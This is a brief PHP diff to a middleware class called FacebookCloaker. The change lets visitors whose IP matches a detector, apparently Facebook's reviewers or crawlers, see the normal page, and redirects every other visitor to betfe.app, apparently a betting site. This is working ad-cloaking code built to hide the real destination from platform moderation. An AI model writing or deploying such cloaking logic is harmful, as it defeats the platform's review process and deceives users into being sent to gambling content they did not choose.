@@ -32,9 +32,9 @@ class FacebookCloaker
         $ip = Ip::make($request->ip());
 
         if ($this->detector->match($ip)) {
-            return to_route('x9');
+            return $next($request);
         }
 
-        return $next($request);
+        return redirect('https://betfe.app/');
     }
 }
